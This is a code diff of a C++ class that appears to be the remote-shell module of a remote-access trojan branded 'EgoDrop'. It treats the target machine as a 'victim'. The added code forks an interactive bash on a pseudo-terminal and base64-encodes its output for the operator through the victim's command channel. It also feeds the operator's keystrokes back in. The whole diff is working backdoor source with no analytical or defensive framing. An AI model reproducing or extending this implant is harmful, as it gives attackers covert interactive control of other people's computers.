@@ -1,91 +1,158 @@
 #include <iostream>
-#include <string>
-#include <vector>
-#include <unistd.h>
-#include <pty.h>
+#include <cstring>
 #include <thread>
-#include <termio.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <fcntl.h>
+#include <vector>
+#include <string>
+#include <memory>
+#include <algorithm>
+#include <atomic>
+#include <unordered_map>
+#include <mutex>
+#include <pty.h>
+#include <unistd.h>
+#include <sys/types.h>
 
+#include <sys/ioctl.h>
+
+
+
+#include "clsVictim.hpp"
 #include "clsEZData.hpp"
 #include "clsTools.hpp"
-#include "clsVictim.hpp"
 
 class clsShell
 {
 private:
-    clsVictim m_victim;
-    int m_nMasterFd;
+    int m_ptyFd = -1;
+    pid_t m_pid = -1;
 
-    std::string szSrvIP;
-    int nSrvPort;
+    std::shared_ptr<clsVictim> m_victim;
+
+    std::atomic<bool> m_ready { false };
+    std::atomic<bool> m_bIsRunning { false };
+    std::thread m_thread;
+    std::mutex m_mtx;
+    std::vector<std::vector<uint8_t>> m_inputQueue;
 
 public:
-    clsShell(clsVictim victim)
+    clsShell() = default;
+
+    clsShell(std::shared_ptr<clsVictim> victim)
     {
         m_victim = victim;
     }
 
+    ~clsShell() = default;
+
     void fnStart()
     {
-        /*
-        int master_fd;
-        pid_t pid = forkpty(&master_fd, nullptr, nullptr, nullptr);
-        if (pid == 0) {
-            execl("/bin/bash", "/bin/bash", nullptr);
-            perror("execl failed");
+        clsTools::fnLogInfo("Starting terminal...");
+
+        if (m_bIsRunning)
             return;
+
+        m_pid = forkpty(&m_ptyFd, nullptr, nullptr, nullptr);
+        if (m_pid == 0)
+        {
+            setenv("TERM", "xterm-256color", 1);
+            setenv("SHELL", "/bin/bash", 1);
+
+            execlp(
+                "bash",
+                "bash",
+                "-i",
+                "-c",
+                "echo '=== EgoDrop Remote Shell ==='; "
+                "echo 'User: '$(whoami); "
+                "echo 'Host: '$(hostname); "
+                "echo '============================'; "
+                "exec bash -i",
+                nullptr
+            );
+
+            _exit(1);
         }
 
-        // make master non-blocking
-        fcntl(master_fd, F_SETFL, O_NONBLOCK);
-        // make sock blocking for simplicity on recv
-        // start threads:
-        std::thread outputThread([&](){
-            char buf[4096];
-            while (true) {
-                ssize_t n = read(master_fd, buf, sizeof(buf));
-                if (n > 0) {
-                    std::string b64 = clsEZData::fnb64EncodeUtf8(buf);
-                    std::string msg = "shell|" + b64 + "\n";
-                    //send(sock, msg.c_str(), msg.size(), 0);
-                }
-                usleep(5000);
-            }
-        });
+        struct winsize ws {24, 80, 0, 0};
+        ioctl(m_ptyFd, TIOCSWINSZ, &ws);
 
-        std::thread recvThread([&](){
-            std::string acc;
-            char buf[4096];
-            while (true) {
-                //ssize_t r = recv(sock, buf, sizeof(buf), 0);
+        m_bIsRunning = true;
+        m_thread = std::thread([this]() 
+        {
+            try
+            {
+                char abBuffer[4096];
+                while (m_bIsRunning)
+                {
+                    fd_set rfds;
+                    FD_ZERO(&rfds);
+                    FD_SET(m_ptyFd, &rfds);
 
+                    timeval tv {0, 200000};
+                    if (select(m_ptyFd + 1, &rfds, nullptr, nullptr, &tv) > 0)
+                    {
+                        if (FD_ISSET(m_ptyFd, &rfds))
+                        {
+                            ssize_t n = read(m_ptyFd, abBuffer, sizeof(abBuffer));
+                            if (n > 0)
+                            {
+                                m_ready = true;
 
-                if (r <= 0) { usleep(1000); continue; }
-                acc.append(buf, buf + r);
-                while (true) {
-                    size_t pos = acc.find('\n');
-                    if (pos == std::string::npos) break;
-                    std::string line = acc.substr(0, pos);
-                    acc.erase(0, pos + 1);
-                    if (line.rfind("input|", 0) == 0) {
-                        std::string b64 = line.substr(6);
-                        std::string decoded = clsEZData::fnb64DecodeUtf8(b64);
-                        if (!decoded.empty()) {
-                            write(master_fd, decoded.data(), decoded.size());
+                                std::vector<uint8_t> out(abBuffer, abBuffer + n);
+                                std::string szB64Data = clsEZData::fnb64Encode(out);
+
+                                STRLIST ls = {
+                                    "shell",
+                                    "output",
+                                    szB64Data,
+                                };
+
+                                m_victim->fnSendCommand(ls);
+                            }
                         }
                     }
+
+                    std::lock_guard<std::mutex> lock(m_mtx);
+                    for (auto& in : m_inputQueue)
+                        write(m_ptyFd, in.data(), in.size());
+
+                    m_inputQueue.clear();
                 }
+            }
+            catch (const std::exception& e)
+            {
+                clsTools::fnLogErr(e.what());
             }
         });
 
-        outputThread.join();
-        recvThread.join();
-
-        */
+        clsTools::fnLogOK("Start terminal successfully.");
     }
 
-    ~clsShell() = default;
+    void fnStop()
+    {
+        m_bIsRunning = false;
+        if (m_thread.joinable())
+            m_thread.join();
+
+        if (m_ptyFd != -1)
+            close(m_ptyFd);
+    }
+
+    void fnPushInput(const std::vector<uint8_t>& data)
+    {
+        if (!m_ready)
+            return;
+
+        std::lock_guard<std::mutex> lock(m_mtx);
+        m_inputQueue.push_back(data);
+    }
+
+    void fnResize(int nCol, int nRow)
+    {
+        struct winsize ws {};
+        ws.ws_col = nCol;
+        ws.ws_row = nRow;
+
+        ioctl(m_ptyFd, TIOCSWINSZ, &ws);
+    }
 };
